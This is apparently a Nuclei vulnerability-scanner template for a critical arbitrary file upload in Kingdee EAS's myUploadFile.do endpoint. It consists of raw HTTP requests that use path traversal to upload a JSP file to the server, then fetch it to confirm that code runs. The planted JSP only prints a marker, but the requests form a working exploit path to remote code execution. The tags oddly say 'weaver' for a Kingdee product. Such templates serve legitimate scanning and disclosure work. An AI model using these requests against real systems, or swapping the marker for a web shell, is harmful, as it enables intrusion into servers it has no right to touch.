id: jindieOA-EAS-myUploadFile-file-upload
info:
  name: 金蝶EAS myUploadFile任意文件上传
  author: cnaq
  severity: critical
  description: 金蝶EAS myUploadFile任意文件上传
  reference:
    - https://github.com/wy876/POC/blob/main/%E9%87%91%E8%9D%B6EAS%20myUploadFile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
  tags: weaver,rce

requests:
  - raw:
      - |
        POST /easportal/buffalo/%2e%2e/cm/myUploadFile.do HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySq4lDnabv8CwHfvx
        Content-Length: 205

        ------WebKitFormBoundarySq4lDnabv8CwHfvx
        Content-Disposition: form-data; name="myFile"; filename="test3ed.jsp"
        Content-Type: text/html

        <%out.println("test3er4");%>
        ------WebKitFormBoundarySq4lDnabv8CwHfvx--

      - |
        GET /easportal/buffalo/../test3ed.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: regex
        part: body
        regex:
          - 'test3er4'